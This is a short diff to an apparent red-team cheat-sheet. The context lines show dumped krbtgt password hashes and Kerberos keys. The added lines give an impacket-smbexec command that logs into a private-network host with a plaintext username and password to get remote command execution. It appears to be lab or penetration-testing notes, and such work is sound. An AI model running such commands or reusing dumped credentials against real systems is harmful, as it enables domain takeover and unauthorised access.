@@ -115,5 +115,7 @@ krbtgt:502:aad3b435b51404eeaad3b435b51404ee:e57dd34c1871b7a23fb17a77dec9b900:::
 	krbtgt:aes128-cts-hmac-sha1-96:806d6ea798a9626d3ad00516dd6968b5
 	krbtgt:des-cbc-md5:ba0b49b6b6455885
 
+# Remote login with exec
+	impacket-smbexec corpmngr:"User4&*&*"@192.168.98.120
 
 # RedTeam-CheckSheet
